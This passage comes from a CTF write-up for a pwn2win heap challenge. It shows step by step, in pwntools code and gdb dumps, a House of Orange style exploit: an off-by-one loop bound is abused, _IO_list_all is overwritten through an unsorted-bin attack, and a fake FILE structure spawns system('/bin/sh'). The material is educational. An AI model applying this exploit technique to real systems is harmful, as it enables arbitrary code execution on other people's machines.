</span></code></pre><p>Let's script what we desire<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span>    IO_list  </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>libc</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'_IO_list_all'</span><span>]
</span><span>    bk </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1960
</span><span>    fd </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1440 </span><span style=color:#f29668>- </span><span style=color:#f29718>0x8
</span><span>    </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#c2d94c>'y'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>7</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(fd) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(bk))
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>
</span></code></pre><p>And see how the chunks look like -><pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0000</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48150</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e4520 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa62626262 (</span><span style=color:#c2d94c>'bbbb\n'</span><span>)
</span><span style=color:#ffb454>0008</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48158</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0016</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48160</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e4f40 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa64646464 (</span><span style=color:#c2d94c>'dddd\n'</span><span>)
</span><span style=color:#ffb454>0024</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48168</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0032</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48170</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e5960 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa66666666 (</span><span style=color:#c2d94c>'ffff\n'</span><span>)                   </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> This is chunk 3 , our supposed fake chunk
</span><span style=color:#ffb454>0040</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48178</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0048</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48180</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e5e70 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa67676767 (</span><span style=color:#c2d94c>'gggg\n'</span><span>)
</span><span style=color:#ffb454>0056</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48188</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0064</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48190</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e6380 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa68686868 (</span><span style=color:#c2d94c>'hhhh\n'</span><span>)
</span><span style=color:#ffb454>0072</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb48198</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0080</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb481a0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e5450 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e4a20 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0088</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb481a8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0096</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x561a4bb481b0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e4a30 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x561a4d2e5960 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa66666666 (</span><span style=color:#c2d94c>'ffff\n'</span><span>) </span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> Clean , we overwrote fd with chunk 3</span><span style=color:#c2d94c>'s addr
</span><span style=color:#c2d94c>0104| 0x561a4bb481b8 --> 0x1 
</span><span style=color:#c2d94c>0112| 0x561a4bb481c0 --> 0x561a4d2e4010 --> 0x7fdc8f575b78 --> 0x561a4d2e6880 --> 0x0 
</span><span style=color:#c2d94c>
</span></code></pre><p>Now we edit chunk 3 and fake our chunk there.<p>We create our fake chunk in our chunk 3 , so that we can overwrite the size of the next chunk.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span>    bk </span><span style=color:#f29668>= </span><span>IO_list </span><span style=color:#f29668>- </span><span style=color:#f29718>0x10
</span><span>    fd </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xa20
</span><span>    </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#c2d94c>'y'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>3</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x511</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(fd) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(bk))
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>
</span></code></pre><p>Let's see how chunk 3 looks like now.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
</span><span style=color:#ffb454>0x561a3e08d950:</span><span>	0x0000000000000510	0x0000000000000510 
</span><span style=color:#ffb454>0x561a3e08d960:</span><span>	0x0000000000000000	0x0000000000000511 -</span><span style=color:#f29668>></span><span> Fake chunk header
</span><span style=color:#ffb454>0x561a3e08d970:</span><span>	0x0000561a3e08ca20	0x00007fc7d9e04510 -</span><span style=color:#f29668>></span><span> fd and bk set appropriately
</span><span style=color:#ffb454>0x561a3e08d980:</span><span>	0x000000000000000a	0x0000000000000000
</span><span>
</span></code></pre><p>Well , its time to trigger overwrite of <strong>IO_list_all</strong> pointer by mallocing 2 chunks.<p>The third call to malloc should return our fake chunk.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=font-style:italic;color:#5c6773>#Get stuff back from unsorted bin
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>"third"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"aaaa"</span><span>)
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>"third"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"bbbb"</span><span>)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Finally get back our fake chunk and overwrite the size of the next chunk with 0x91
</span><span>    payload </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'f'</span><span style=color:#f29668>*</span><span style=color:#f29718>8 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>0x500</span><span style=color:#f29668>-</span><span style=color:#f29718>0x8</span><span>)</span><span style=color:#f29668>/</span><span style=color:#f29718>8 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x91</span><span>)
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>"third"</span><span style=color:#bfbab0cc>,</span><span>payload)
</span><span>
</span></code></pre><p>With this , we successfully faked the size of a valid chunk.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0x555555759e60:</span><span>	0x0000000000000000	0x0000000000000091
</span><span style=color:#ffb454>0x555555759e70:</span><span>	0x0000000a67676767	0x0000000000000001
</span><span>
</span></code></pre><p>Looks like our fake chunk is in second user's area. We sign_out and sign_in back into second user.<p>We free the 0x91 chunk now.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>sign_out</span><span>()
</span><span>    </span><span style=color:#ffb454>sign_in</span><span>(</span><span style=color:#c2d94c>"second"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"second"</span><span>)
</span><span>    </span><span style=color:#ffb454>delete</span><span>(</span><span style=color:#f29718>4</span><span>) 
</span><span>
</span></code></pre><p>Cool , its a part of unsorted bin now.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
</span><span style=color:#ffb454>0x555555759e60:</span><span>	0x0000000000000000	0x0000000000000091
</span><span style=color:#ffb454>0x555555759e70:</span><span>	0x00007ffff7dd1b78	0x00007ffff7dd1b78
</span><span style=color:#ffb454>0x555555759e80:</span><span>	0x0000000000000000	0x0000000000000000
</span><span>
</span><span style=color:#ffb454>$</span><span>1 = {
</span><span>  mutex = 0x0</span><span style=color:#bfbab0cc>,
</span><span>  flags = 0x1</span><span style=color:#bfbab0cc>,
</span><span>  fastbinsY = {0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0</span><span style=color:#bfbab0cc>,</span><span> 0x0}</span><span style=color:#bfbab0cc>,
</span><span>  top = 0x55555575a880</span><span style=color:#bfbab0cc>,
</span><span>  last_remainder = 0x0</span><span style=color:#bfbab0cc>,
</span><span>  bins = {0x555555759e60</span><span style=color:#bfbab0cc>,</span><span> 0x555555759e60</span><span style=color:#bfbab0cc>,</span><span>......}
</span><span>
</span></code></pre><p>The aim is to get a 0x61 sized unsorted bin for easy IO_list_all overwrite.<p>For that , we need to do some additional work , we sign back in to first user and edit the chunk above our fake chunk to make it's size 0x61 this time.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    
</span><span>    </span><span style=color:#ffb454>sign_out</span><span>()
</span><span>    </span><span style=color:#ffb454>sign_in</span><span>(</span><span style=color:#c2d94c>"first_user"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"first_user"</span><span>)
</span><span>    payload </span><span style=color:#f29668>= </span><span style=color:#c2d94c>"llll"</span><span style=color:#f29668>+</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>"</span><span style=color:#f29668>*</span><span style=color:#f29718>1260 </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>"/bin/sh</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>" </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x61</span><span>)
</span><span>    </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#c2d94c>'y'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>11</span><span style=color:#bfbab0cc>,</span><span>payload)  </span><span style=font-style:italic;color:#5c6773>#our fake chunk is first_user's 11th chunk 
</span><span>
</span></code></pre><p>But how come we can access our fake chunk from 11th offset , there are only 10 testimonials per user right?<p>The answer is that fishy for loop range we saw previously is helping us achieve this.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>=</span><span> v8</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><=</span><span> dword_555555757080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1]</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>
</span></code></pre><p>Finally we edit our fake chunk with the file structure that satisfies the constraints of calling <strong>system("/bin/sh")</strong> from malloc abort.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span>    addr </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1f30
</span><span>    vtable </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1f58
</span><span>    system </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>libc</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'system'</span><span>]
</span><span>    payload </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xdeadbeef</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(IO_list</span><span style=color:#f29668>- </span><span style=color:#f29718>0x10</span><span>)
</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>16 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(addr)
</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>3 </span><span style=color:#f29668>+</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>+</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>2
</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(vtable) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>1</span><span>)</span><span style=color:#f29668>+</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>2</span><span>)</span><span style=color:#f29668>+</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>3</span><span>)</span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>3 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(system)
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>    </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#c2d94c>'y'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>5</span><span style=color:#bfbab0cc>,</span><span>payload)
</span><span>
</span></code></pre><p>Next malloc call should definitely overwrite <strong>_IO_list_all</strong> and subsequently abort also , thus giving us shell.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>   </span><span style=color:#ffb454>0x7ffff7a8ee0c </span><span style=color:#f29668><</span><span>_int_malloc+652</span><span style=color:#f29668>></span><span>:	mov    QWORD PTR </span><span style=color:#ff7733>[</span><span>rbx+0x70</span><span style=color:#ff7733>]</span><span>,r15
</span><span>   </span><span style=color:#ffb454>0x7ffff7a8ee10 </span><span style=color:#f29668><</span><span>_int_malloc+656</span><span style=color:#f29668>></span><span>:	mov    QWORD PTR </span><span style=color:#ff7733>[</span><span>r15+0x10</span><span style=color:#ff7733>]</span><span>,r12
</span><span>
</span></code></pre><p>r15 was the fd which was IO_list-0x10 , and that is overwritten with r12 which is the pointer to top chunk in main_arena.<p>Now while closing the file structures , in the linked list , <strong>IO_flushall_lockp</strong> will be fooled to see our fake file structure and thus give us shell.<p>On the very next malloc , we get our sweet shell.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>"third"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"shell"</span><span>)
</span><span>
</span></code></pre><h2 id=conclusion>CONCLUSION</h2><p>Awesome challenge , Awesome Idea , kudos to team pwn2win for such a beautiful challenge.<p>Here's the complete <a href=https://gist.github.com/PwnVerse/96c30d61ac33d692c04074157d033c31>Script</a><h3 id=references>References</h3><ul><li><a href=https://jkrshnmenon.wordpress.com/2017/08/30/hitcon-2016-house-of-orange-writeup/>JayKrishna Menon's Blog</a></ul></section></article></main></div>